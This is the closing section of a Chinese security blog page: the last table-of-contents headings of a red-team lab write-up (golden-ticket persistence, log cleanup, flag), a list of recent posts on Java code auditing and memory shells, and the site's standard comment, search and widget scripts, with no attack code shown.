class="toc-text">权限维持（黄金票据）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%B8%85%E7%90%86"><span class="toc-number">2.3.7.</span> <span class="toc-text">日志清理</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#flag"><span class="toc-number">3.</span> <span class="toc-text">flag</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">4.</span> <span class="toc-text">参考</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/6fe81bcd/" title="红日靶场1">红日靶场1</a><time datetime="2026-06-16T08:52:44.000Z" title="发表于 2026-06-16 16:52:44">2026-06-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/7ca98e62/" title="java代码审计之sql注入">java代码审计之sql注入</a><time datetime="2026-05-15T04:14:00.000Z" title="发表于 2026-05-15 12:14:00">2026-05-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/13c61d37/" title="java代码审计之xss">java代码审计之xss</a><time datetime="2026-05-02T05:15:15.000Z" title="发表于 2026-05-02 13:15:15">2026-05-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/17f04675/" title="java内存马_8">java内存马_8</a><time datetime="2026-03-31T12:47:42.000Z" title="发表于 2026-03-31 20:47:42">2026-03-31</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/874f5be4/" title="java内存马_7">java内存马_7</a><time datetime="2026-03-07T12:23:25.000Z" title="发表于 2026-03-07 20:23:25">2026-03-07</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">©2025 - 2026 By 红烧花园宝宝</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.0-b2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+  const option = null
+
+  const getGiscusTheme = theme => theme === 'dark' ? 'dark' : 'light'
+
+  const createScriptElement = config => {
+    const ele = document.createElement('script')
+    Object.entries(config).forEach(([key, value]) => {
+      ele.setAttribute(key, value)
+    })
+    return ele
+  }
+
+  const loadGiscus = (el = document, key) => {
+    const mappingConfig = isShuoshuo
+      ? { 'data-mapping': 'specific', 'data-term': key }
+      : { 'data-mapping': (option && option['data-mapping']) || 'pathname' }
+
+    const giscusConfig = {
+      src: 'https://giscus.app/client.js',
+      'data-repo': 'LXu2n/LXu2n.github.io',
+      'data-repo-id': 'R_kgDOOuja2g',
+      'data-category-id': 'DIC_kwDOOuja2s4C020T',
+      'data-theme': getGiscusTheme(document.documentElement.getAttribute('data-theme')),
+      'data-reactions-enabled': '1',
+      crossorigin: 'anonymous',
+      async: true,
+      ...option,
+      ...mappingConfig
+    }
+
+    const scriptElement = createScriptElement(giscusConfig)
+
+    el.querySelector('#giscus-wrap').appendChild(scriptElement)
+
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyGiscus = () => {
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+  }
+
+  const changeGiscusTheme = theme => {
+    const iframe = document.querySelector('#giscus-wrap iframe')
+    if (iframe) {
+      const message = {
+        giscus: {
+          setConfig: {
+            theme: getGiscusTheme(theme)
+          }
+        }
+      }
+      iframe.contentWindow.postMessage(message, 'https://giscus.app')
+    }
+  }
+
+  btf.addGlobalFn('themeChange', changeGiscusTheme, 'giscus')
+
+  if (isShuoshuo) {
+    'Giscus' === 'Giscus'
+      ? window.shuoshuoComment = { loadComment: loadGiscus }
+      : window.loadOtherComment = loadGiscus
+    return
+  }
+
+  if ('Giscus' === 'Giscus' || !false) {
+    if (false) btf.loadComment(document.getElementById('giscus-wrap'), loadGiscus)
+    else loadGiscus()
+  } else {
+    window.loadOtherComment = loadGiscus
+  }
+})()</script></div><script defer="" src="/js/bubble.js"></script><script src="/styles/fish.js"></script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><script async="" data-pjax="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"></div></div><hr><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script></body></html>
